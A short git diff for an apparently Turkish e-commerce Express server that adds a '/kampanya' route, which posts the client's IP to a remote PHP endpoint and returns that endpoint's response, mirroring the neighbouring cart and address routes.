@@ -61,6 +61,23 @@ app.get('/sepet', async (req, res) => {
   }
 });
 
+app.get('/kampanya', async (req, res) => {
+  try {
+    const clientIp = getClientIp(req);
+    const response = await axios.post(
+      'https://forestgreen-rook-759809.hostingersite.com/dmn/kampanya.php',
+      qs.stringify({ ip: clientIp }),
+      {
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+      }
+    );
+    res.send(response.data);
+  } catch (error) {
+    console.error('Sepet çekme hatası:', error.message);
+    res.status(500).send('Sunucudan veri alınamadı.');
+  }
+});
+
 app.get('/adres', async (req, res) => {
   try {
     const clientIp = getClientIp(req);
